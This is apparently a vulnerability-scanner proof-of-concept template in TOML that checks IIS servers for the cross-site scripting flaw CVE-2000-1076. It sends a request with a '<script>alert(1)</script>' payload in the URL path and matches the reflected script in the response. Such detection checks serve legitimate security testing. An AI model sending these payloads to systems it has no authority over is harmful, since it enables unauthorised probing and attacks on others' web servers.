[info]
author = "AVE"
description = "检测目标是否存在 IIS 跨站脚本漏洞"
id = "POC-AVE-2000-1988"
name = "CVE-2000-1076 PoC"
severity = "medium"
tags = ["cve-2000-1076"]
vuln_id = [
    "CVE-2000-1076",
    "AVE-2000-1988",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/<script>alert(1)</script>.asp"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(1)</script>"]
